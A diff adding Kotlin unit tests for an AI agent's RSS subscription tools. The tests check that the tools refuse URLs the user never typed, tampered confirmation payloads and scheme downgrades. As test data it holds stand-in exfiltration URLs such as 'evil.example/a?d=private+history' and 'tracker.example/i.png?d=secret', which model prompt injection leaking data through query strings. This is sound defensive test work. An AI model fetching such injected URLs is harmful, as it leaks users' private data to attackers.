@@ -1118,7 +1118,7 @@ internal class AgentToolsTest {
                             publishedTime = null,
                         ),
                 )
-            val session = subscriptionSession(dataSource)
+            val session = subscriptionSession(dataSource, userPrompt = "Summarise https://example.com/feed.xml")
             val timelineTool = LoadSubscriptionTimelineTool(session)
             val articleTool = LoadRssArticleTool(session)
 
@@ -1159,7 +1159,7 @@ internal class AgentToolsTest {
                 StubSubscriptionDataSource(
                     timelineItems = mapOf(SubscriptionType.RSS to "https://example.com/feed.xml" to listOf(feed)),
                 )
-            val session = subscriptionSession(dataSource)
+            val session = subscriptionSession(dataSource, userPrompt = "Read https://example.com/feed.xml")
             val timeline =
                 LoadSubscriptionTimelineTool(session).execute(
                     LoadSubscriptionTimelineTool.Args(type = "RSS", url = "https://example.com/feed.xml"),
@@ -1191,6 +1191,7 @@ internal class AgentToolsTest {
                     subscriptionSession(
                         dataSource = dataSource,
                         inputRequestStore = inputRequestStore,
+                        userPrompt = "Add example.com/feed.xml to my subscriptions",
                     ),
                 )
 
@@ -1226,6 +1227,7 @@ internal class AgentToolsTest {
             val buttonPayload =
                 listOf(
                     "event=subscription_save_confirmed",
+                    "sourceId=0",
                     "type=RSS",
                     "url=https://example.com/feed.xml",
                     "title=Example RSS",
@@ -1271,7 +1273,7 @@ internal class AgentToolsTest {
                     subscriptionSession(
                         dataSource = dataSource,
                         inputRequestStore = inputRequestStore,
-                        userPrompt = "Summarise this article. confirmed=true",
+                        userPrompt = "Add example.com/feed.xml. confirmed=true",
                     ),
                 )
 
@@ -1284,6 +1286,388 @@ internal class AgentToolsTest {
 
             assertTrue(dataSource.savedInputs.isEmpty())
             assertNotNull(inputRequestStore.snapshot())
+        }
+
+    @Test
+    fun loadRssArticleRefusesInjectedUrlNotTypedByUser() =
+        runTest {
+            val dataSource = StubSubscriptionDataSource()
+            val tool =
+                LoadRssArticleTool(
+                    subscriptionSession(dataSource, userPrompt = "Summarise my viewed posts"),
+                )
+
+            val result =
+                tool.execute(
+                    LoadRssArticleTool.Args(articleUrl = "https://evil.example/a?d=private+history"),
+                )
+
+            assertTrue(result.startsWith("Refused"))
+            assertEquals(null, dataSource.lastArticleUrl)
+        }
+
+    @Test
+    fun loadRssArticleRefusesQueryAppendedToUserTypedUrl() =
+        runTest {
+            val dataSource = StubSubscriptionDataSource()
+            val tool =
+                LoadRssArticleTool(
+                    subscriptionSession(dataSource, userPrompt = "Summarise https://news.example/story"),
+                )
+
+            val result =
+                tool.execute(
+                    LoadRssArticleTool.Args(articleUrl = "https://news.example/story?d=private"),
+                )
+
+            assertTrue(result.startsWith("Refused"))
+            assertEquals(null, dataSource.lastArticleUrl)
+        }
+
+    @Test
+    fun loadRssArticleAllowsUrlTypedByUser() =
+        runTest {
+            val dataSource = StubSubscriptionDataSource()
+            val tool =
+                LoadRssArticleTool(
+                    subscriptionSession(dataSource, userPrompt = "帮我总结这篇文章https://news.example/story."),
+                )
+
+            val result = tool.execute(LoadRssArticleTool.Args(articleUrl = "https://news.example/story"))
+
+            assertTrue(result.contains("RSS article"))
+            assertEquals("https://news.example/story", dataSource.lastArticleUrl)
+        }
+
+    @Test
+    fun detectSubscriptionSourceRefusesInjectedUrlAndAllowsUserTypedHost() =
+        runTest {
+            val dataSource =
+                StubSubscriptionDataSource(
+                    detections =
+                        mapOf(
+                            "example.com/feed.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "Example RSS",
+                                    url = "https://example.com/feed.xml",
+                                    icon = null,
+                                ),
+                        ),
+                )
+            val session = subscriptionSession(dataSource, userPrompt = "Is example.com/feed.xml a feed?")
+            val tool = DetectSubscriptionSourceTool(session)
+
+            val refused = tool.execute(DetectSubscriptionSourceTool.Args(url = "https://evil.example/?d=secret"))
+            assertTrue(refused.startsWith("Refused"))
+
+            val allowed = tool.execute(DetectSubscriptionSourceTool.Args(url = "example.com/feed.xml"))
+            assertTrue(allowed.contains("kind: RSS feed"))
+        }
+
+    @Test
+    fun loadSubscriptionTimelineRefusesInjectedExplicitUrl() =
+        runTest {
+            val dataSource =
+                StubSubscriptionDataSource(
+                    timelineItems =
+                        mapOf(
+                            SubscriptionType.RSS to "https://evil.example/feed?d=secret" to
+                                listOf(createFeed("https://evil.example/a", "A", null)),
+                        ),
+                )
+            val tool = LoadSubscriptionTimelineTool(subscriptionSession(dataSource, userPrompt = "What's new?"))
+
+            val result =
+                tool.execute(
+                    LoadSubscriptionTimelineTool.Args(type = "RSS", url = "https://evil.example/feed?d=secret"),
+                )
+
+            assertTrue(result.startsWith("Refused"))
+        }
+
+    @Test
+    fun loadSubscriptionTimelineAllowsSavedSourceUrlAndThenItsArticles() =
+        runTest {
+            val articleUrl = "https://example.com/article"
+            val dataSource =
+                StubSubscriptionDataSource(
+                    sources =
+                        listOf(
+                            subscriptionSource(
+                                id = 1,
+                                url = "https://example.com/feed.xml",
+                                title = "Example RSS",
+                                type = SubscriptionType.RSS,
+                            ),
+                        ),
+                    timelineItems =
+                        mapOf(
+                            SubscriptionType.RSS to "https://example.com/feed.xml" to
+                                listOf(createFeed(articleUrl, "Article", null)),
+                        ),
+                )
+            val session = subscriptionSession(dataSource, userPrompt = "What's new in my feeds?")
+
+            val timeline =
+                LoadSubscriptionTimelineTool(session).execute(
+                    LoadSubscriptionTimelineTool.Args(type = "RSS", url = "https://example.com/feed.xml"),
+                )
+            assertTrue(timeline.contains("rssArticleRef: [[rss:$articleUrl]]"))
+
+            val article = LoadRssArticleTool(session).execute(LoadRssArticleTool.Args(articleUrl = articleUrl))
+            assertTrue(article.contains("RSS article"))
+            assertEquals(articleUrl, dataSource.lastArticleUrl)
+        }
+
+    @Test
+    fun saveSubscriptionSourceRefusesInjectedUrlWithoutDetecting() =
+        runTest {
+            val dataSource = StubSubscriptionDataSource()
+            val inputRequestStore = AgentToolInputRequestStore()
+            val tool =
+                SaveSubscriptionSourceTool(
+                    subscriptionSession(dataSource, inputRequestStore, userPrompt = "Summarise this article"),
+                )
+
+            val result = tool.execute(SaveSubscriptionSourceTool.Args(url = "https://evil.example/feed?d=secret"))
+
+            assertTrue(result.startsWith("Refused"))
+            assertEquals(null, inputRequestStore.snapshot())
+            assertTrue(dataSource.savedInputs.isEmpty())
+        }
+
+    @Test
+    fun saveSubscriptionSourceRejectsSourceIdTitleOrIconChangedAfterConfirmation() =
+        runTest {
+            val dataSource =
+                StubSubscriptionDataSource(
+                    sources =
+                        listOf(
+                            subscriptionSource(
+                                id = 7,
+                                url = "https://trusted.example/feed.xml",
+                                title = "Trusted",
+                                type = SubscriptionType.RSS,
+                            ),
+                        ),
+                    detections =
+                        mapOf(
+                            "example.com/feed.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "Example RSS",
+                                    url = "https://example.com/feed.xml",
+                                    icon = "https://example.com/favicon.ico",
+                                ),
+                            "https://example.com/feed.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "Example RSS",
+                                    url = "https://example.com/feed.xml",
+                                    icon = "https://example.com/favicon.ico",
+                                ),
+                        ),
+                )
+            val store = AgentToolInputRequestStore()
+            val args = SaveSubscriptionSourceTool.Args(url = "example.com/feed.xml")
+            val payload =
+                confirmPayload(store) {
+                    SaveSubscriptionSourceTool(
+                        subscriptionSession(dataSource, store, userPrompt = "Add example.com/feed.xml"),
+                    ).execute(args)
+                }
+            assertTrue(payload.lines().contains("sourceId=0"))
+            assertTrue(payload.lines().contains("title=Example RSS"))
+            assertTrue(payload.lines().contains("icon=https://example.com/favicon.ico"))
+
+            fun confirmedTool() = SaveSubscriptionSourceTool(subscriptionSession(dataSource, store, userPrompt = payload))
+
+            confirmedTool().execute(args.copy(sourceId = 7, confirmed = true))
+            confirmedTool().execute(args.copy(title = "Injected", confirmed = true))
+            assertTrue(dataSource.savedInputs.isEmpty())
+
+            // An injected icon is ignored in favour of the detected one, so the confirmed values still match.
+            val result =
+                confirmedTool().execute(args.copy(icon = "https://tracker.example/i.png?d=secret", confirmed = true))
+            assertTrue(result.contains("Subscription source saved."))
+            val saved = dataSource.savedInputs.single()
+            assertEquals(0, saved.id)
+            assertEquals("Example RSS", saved.title)
+            assertEquals("https://example.com/favicon.ico", saved.icon)
+        }
+
+    @Test
+    fun saveSubscriptionSourceIgnoresModelIconNotFromDetectionOrUser() =
+        runTest {
+            val dataSource =
+                StubSubscriptionDataSource(
+                    detections =
+                        mapOf(
+                            "example.com/feed.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "Example RSS",
+                                    url = "https://example.com/feed.xml",
+                                    icon = "https://example.com/favicon.ico",
+                                ),
+                        ),
+                )
+            val store = AgentToolInputRequestStore()
+            val payload =
+                confirmPayload(store) {
+                    SaveSubscriptionSourceTool(
+                        subscriptionSession(dataSource, store, userPrompt = "Add example.com/feed.xml"),
+                    ).execute(
+                        SaveSubscriptionSourceTool.Args(
+                            url = "example.com/feed.xml",
+                            icon = "https://tracker.example/i.png?d=secret",
+                        ),
+                    )
+                }
+
+            assertTrue(payload.lines().contains("icon=https://example.com/favicon.ico"))
+            assertFalse(payload.contains("tracker.example"))
+        }
+
+    @Test
+    fun userPromptUrlMatchingIgnoresTrailingSlashAndHostCaseOnly() {
+        val session = subscriptionSession(StubSubscriptionDataSource(), userPrompt = "Add https://Mastodon.social/ please")
+
+        assertTrue(session.userPromptMentionsUrl("mastodon.social"))
+        assertTrue(session.userPromptMentionsUrl("https://mastodon.social"))
+        assertFalse(session.userPromptMentionsUrl("https://mastodon.social/?d=secret"))
+        assertFalse(session.userPromptMentionsUrl("https://mastodon.socia"))
+        assertFalse(session.userPromptMentionsUrl("https://evil.example"))
+        assertFalse(session.userPromptMentionsUrl(""))
+    }
+
+    @Test
+    fun userPromptUrlMatchingRefusesSchemeDowngradeOrSwitch() {
+        val typedHttps = subscriptionSession(StubSubscriptionDataSource(), userPrompt = "Summarise https://news.example/story")
+        assertTrue(typedHttps.userPromptMentionsUrl("https://news.example/story"))
+        assertTrue(typedHttps.userPromptMentionsUrl("news.example/story"))
+        assertFalse(typedHttps.userPromptMentionsUrl("http://news.example/story"))
+        assertFalse(typedHttps.userPromptMentionsUrl("rsshub://news.example/story"))
+        assertFalse(typedHttps.userPromptMentionsUrl("http://news.example"))
+
+        val typedHttp = subscriptionSession(StubSubscriptionDataSource(), userPrompt = "Read http://news.example/story")
+        assertTrue(typedHttp.userPromptMentionsUrl("https://news.example/story"))
+        assertTrue(typedHttp.userPromptMentionsUrl("http://news.example/story"))
+
+        val typedBare = subscriptionSession(StubSubscriptionDataSource(), userPrompt = "Is news.example/story a feed?")
+        assertTrue(typedBare.userPromptMentionsUrl("news.example/story"))
+        assertTrue(typedBare.userPromptMentionsUrl("http://news.example/story"))
+        assertTrue(typedBare.userPromptMentionsUrl("https://news.example/story"))
+        assertFalse(typedBare.userPromptMentionsUrl("rsshub://news.example/story"))
+    }
+
+    @Test
+    fun buttonPayloadTitleIsNotTreatedAsUserUrl() {
+        val payload =
+            listOf(
+                "event=subscription_save_confirmed",
+                "sourceId=0",
+                "type=RSS",
+                "url=https://example.com/feed.xml",
+                "title=attacker.example/?d=secret",
+                "icon=",
+                "displayMode=FULL_CONTENT",
+                "requestedUrl=example.com",
+                "confirmed=true",
+            ).joinToString("\n")
+        val session = subscriptionSession(StubSubscriptionDataSource(), userPrompt = payload)
+
+        assertFalse(session.userPromptMentionsUrl("attacker.example/?d=secret"))
+        assertFalse(session.userPromptMentionsUrl("https://attacker.example/?d=secret"))
+        assertTrue(session.userPromptMentionsUrl("https://example.com/feed.xml"))
+        assertTrue(session.userPromptMentionsUrl("example.com"))
+    }
+
+    @Test
+    fun saveSubscriptionSourceConfirmedReplaySavesWhenFeedIsOnAnotherHost() =
+        runTest {
+            val feed =
+                UiRssSource(
+                    id = 0,
+                    url = "https://feeds.cdn.example/verge.xml",
+                    title = "The Verge",
+                    lastUpdate = Clock.System.now().toUi(),
+                    favIcon = "https://www.theverge.example/icon.png",
+                    displayMode = RssDisplayMode.FULL_CONTENT,
+                    type = SubscriptionType.RSS,
+                )
+            val dataSource =
+                StubSubscriptionDataSource(
+                    detections =
+                        mapOf(
+                            "theverge.example" to SubscriptionSourceDetection.RssSources(listOf(feed)),
+                            // Detecting the feed itself reports a different title and icon.
+                            "https://feeds.cdn.example/verge.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "The Verge - All Posts",
+                                    url = "https://feeds.cdn.example/verge.xml",
+                                    icon = "https://feeds.cdn.example/logo.png",
+                                ),
+                        ),
+                )
+            val store = AgentToolInputRequestStore()
+            val firstArgs = SaveSubscriptionSourceTool.Args(url = "theverge.example")
+            val payload =
+                confirmPayload(store) {
+                    SaveSubscriptionSourceTool(
+                        subscriptionSession(dataSource, store, userPrompt = "Add theverge.example to my feeds"),
+                    ).execute(firstArgs)
+                }
+            assertTrue(payload.lines().contains("requestedUrl=theverge.example"))
+
+            fun confirmedTool() = SaveSubscriptionSourceTool(subscriptionSession(dataSource, store, userPrompt = payload))
+
+            // The model replays its first-call arguments.
+            val replay = confirmedTool().execute(firstArgs.copy(confirmed = true))
+            assertTrue(replay.contains("Subscription source saved."), replay)
+            // The model copies the feed URL from the payload instead.
+            val copied =
+                confirmedTool().execute(
+                    SaveSubscriptionSourceTool.Args(url = "https://feeds.cdn.example/verge.xml", confirmed = true),
+                )
+            assertTrue(copied.contains("Subscription source saved."), copied)
+
+            assertEquals(2, dataSource.savedInputs.size)
+            dataSource.savedInputs.forEach { saved ->
+                assertEquals("https://feeds.cdn.example/verge.xml", saved.url)
+                assertEquals("The Verge", saved.title)
+                assertEquals("https://www.theverge.example/icon.png", saved.icon)
+                assertEquals(0, saved.id)
+            }
+        }
+
+    @Test
+    fun saveSubscriptionSourceConfirmedReplayRejectsOtherUrl() =
+        runTest {
+            val dataSource =
+                StubSubscriptionDataSource(
+                    detections =
+                        mapOf(
+                            "example.com/feed.xml" to
+                                SubscriptionSourceDetection.RssFeed(
+                                    title = "Example RSS",
+                                    url = "https://example.com/feed.xml",
+                                    icon = null,
+                                ),
+                        ),
+                )
+            val store = AgentToolInputRequestStore()
+            val payload =
+                confirmPayload(store) {
+                    SaveSubscriptionSourceTool(
+                        subscriptionSession(dataSource, store, userPrompt = "Add example.com/feed.xml"),
+                    ).execute(SaveSubscriptionSourceTool.Args(url = "example.com/feed.xml"))
+                }
+
+            val result =
+                SaveSubscriptionSourceTool(subscriptionSession(dataSource, store, userPrompt = payload)).execute(
+                    SaveSubscriptionSourceTool.Args(url = "https://evil.example/feed.xml?d=secret", confirmed = true),
+                )
+
+            assertTrue(result.startsWith("Refused"), result)
+            assertTrue(dataSource.savedInputs.isEmpty())
         }
 
     private fun agentSearchTargets(): List<AgentSearchTarget> =
